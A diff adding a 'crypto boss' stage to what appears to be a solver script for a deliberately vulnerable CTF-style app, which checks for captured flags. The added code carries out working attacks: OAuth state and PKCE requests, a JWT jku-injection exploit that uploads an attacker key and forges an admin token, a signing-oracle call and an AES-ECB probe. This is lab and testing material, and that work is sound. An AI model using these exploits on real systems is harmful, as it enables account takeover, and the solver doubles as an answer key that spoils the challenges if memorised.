@@ -221,6 +221,19 @@ const oobTok = 'tok' + Date.now();
   const internal = JSON.parse(cfg.body).internal_token;
   ok('F', 'chain_oob_confirmed', (await txt('/api/black/oob-breach', J({ token: oobTok, internal_token: internal }))).body.includes('lj_chain_oob_internal_breach')); }
 
+// ─────────────────────── v9 CRYPTO BOSS ───────────────────────
+{ const b = (await txt('/oauth/token', J({ code: 'authcode_x', state: 'attacker-state' }))).body;
+  ok(63, 'oauth_pkce', b.includes('lj_oauth_pkce_downgrade'));
+  ok(64, 'oauth_state', b.includes('lj_oauth_state_fixation')); }
+// jku injection: host a known key as an "upload", point jku at it, HS256-sign with it
+{ const keyText = 'attacker-jku-key';
+  await txt('/api/upload', J({ filename: 'k.svg', mime: 'image/svg+xml', dataB64: Buffer.from(keyText).toString('base64') }));
+  const h = b64u(JSON.stringify({ alg: 'HS256', typ: 'JWT', jku: B + '/uploads/k.svg' })), p = b64u(JSON.stringify({ uid: 1, role: 'admin' }));
+  const tok = `${h}.${p}.${b64u(crypto.createHmac('sha256', Buffer.from(keyText)).update(`${h}.${p}`).digest())}`;
+  ok(65, 'jwt_jku', (await txt('/api/session/jku', { headers: { authorization: 'Bearer ' + tok } })).body.includes('lj_jwt_jku_injection')); }
+ok(66, 'signing_oracle', (await txt('/api/sign', J({ data: 'anything' }))).body.includes('lj_signing_oracle'));
+ok(67, 'weak_crypto_ecb', (await txt('/api/seal', J({ data: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' }))).body.includes('lj_aes_ecb_pattern_leak'));
+
 const passed = results.filter((r) => r.pass).length;
 for (const r of results) console.log(`${r.pass ? '✅' : '❌'}  #${String(r.id).padStart(2)}  ${r.name}`);
 console.log(`\n${passed}/${results.length} challenges captured.`);
